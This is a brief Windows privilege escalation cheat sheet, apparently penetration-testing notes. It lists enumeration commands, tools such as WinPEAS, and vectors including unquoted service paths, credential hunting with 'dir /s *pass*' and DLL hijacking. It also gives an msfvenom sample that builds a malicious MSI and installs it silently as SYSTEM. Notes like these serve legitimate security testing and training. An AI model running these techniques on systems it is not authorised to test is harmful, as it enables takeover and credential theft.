# Windows Privilege Escalation

## Quick Checklist

- User privileges: `whoami /priv`, `whoami /groups`
- Running processes: `tasklist /v`
- AlwaysInstallElevated:
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
- Look for unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v """

## Useful Tools

- [WinPEAS](https://github.com/carlospolop/PEASS-ng)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit)

## Common Vectors

- Unquoted service paths - Replace or hijack binaries in those paths
- Insecure service permissions - Modify configs/binaries if writable
- AlwaysInstallElevated - Abuse it to run MSI files as SYSTEM
- Credential hunting - Search for creds in:
  dir /s *pass* == *.txt
- Check registry, config files, saved RDP sessions, etc.
- DLL hijacking - Drop malicious DLLs into folders loaded by privileged apps


## Sample Exploit: AlwaysInstallElevated

```cmd
msfvenom -p windows/exec CMD=calc.exe -f msi > evil.msi
msiexec /quiet /qn /i evil.msi

```

## Notes 
 
Use WinPEAS for automation
Always verify privilege level: whoami, net session, net user
Clean up after testing (especially on real systems)